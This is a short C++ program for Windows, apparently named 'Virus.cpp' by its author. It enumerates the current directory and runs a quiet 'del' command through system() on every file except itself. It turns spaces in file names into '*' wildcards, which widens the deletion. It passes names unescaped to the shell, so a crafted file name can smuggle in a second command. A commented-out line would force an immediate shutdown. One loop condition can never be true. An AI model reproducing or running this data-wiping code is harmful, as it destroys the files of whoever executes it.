#include <cstdlib>
#include <iostream>
#include <dirent.h>
#include <windows.h>

using namespace std;

#define GetCurrentDir _getcwd

int main()
{
	DIR *dir;
	struct dirent *ent;
	char simpan[260][260];
	int i=0;
	char buff[FILENAME_MAX];
  	GetCurrentDir( buff, FILENAME_MAX );
  	printf("Current working dir: %s\n", buff);
	
	
	if ((dir = opendir (buff)) != NULL) {
  		/* print all the files and directories within directory */
  		while ((ent = readdir (dir)) != NULL) {
    		printf ("%s\n", ent->d_name);
    		strcpy(simpan[i],ent->d_name);
    		for(int k=0;k<strlen(simpan[i]);k++){
    			if(simpan[i][k]==' '){
    				simpan[i][k]='*';
				}
				if(simpan[i][k+1] == ' ' && simpan[i][k+1] == '-' && simpan[i][k+1] == 'q')
				{
					break;
				}
			}
    		i++;
  		}
  	closedir (dir);
	} else {
  		/* could not open directory */
  		perror ("");
  		return EXIT_FAILURE;
	}
	
	for(int j=0;j<i;j++)
	{
		if(j==0 || j==1) continue;
		if(strcmp(simpan[j],"Virus.cpp") == 0) continue;
		char command[500];    // 200 is just an example value that can hold the whole string
		sprintf(command, "del %s -q", simpan[j]);
		printf("%s\n",command);
		system(command);
	}
	
	//system("%SystemRoot%\\system32\\shutdown.exe -s -f -t 00");
	//system("PAUSE");
    return EXIT_SUCCESS;
}

